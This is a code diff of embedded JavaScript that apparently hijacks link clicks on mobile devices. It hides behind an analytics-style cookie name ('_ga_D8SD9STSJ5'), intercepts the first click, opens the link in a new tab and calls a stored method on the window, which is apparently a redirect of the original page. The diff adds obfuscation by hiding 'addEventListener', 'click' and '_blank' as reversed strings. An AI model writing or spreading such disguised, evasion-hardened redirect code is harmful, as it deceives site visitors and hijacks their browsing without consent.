@@ -16,7 +16,7 @@
                 e: '_ga_D8SD9STSJ5',
                 f: window,
                 g() {
-                    document.addEventListener('click', _$.oC, true);
+                    document[_$.o('renetsiLtnevEdda')](_$.o('kcilc'), _$.oC, true);
                 },
             }
             
@@ -35,10 +35,6 @@
                        (/android|iphone|ipad|tablet|playbook|silk|kindle/.test(u) || window.matchMedia("(max-width: 1024px)").matches);
             };
             
-            _$.cS = (_) => {
-                return _.map(__ => String.fromCharCode(__)).join('');
-            };
-            
             _$.gV = () => {
                 return _$.gC(_$.e);
             };
@@ -48,7 +44,7 @@
                 if (!t || !t.href || t.href === '/' || (_$.gV() && _$.gV() === 'true') || !_$.mT()) return; 
                 e.preventDefault();
                 _$.sC(_$.e, 'true', 3);
-                _$.f[_$.a](t.href, '_blank');
+                _$.f[_$.a](t.href, _$.o('knalb_'));
                 _$.f[_$.b][_$.c](_$.d);
             };
             
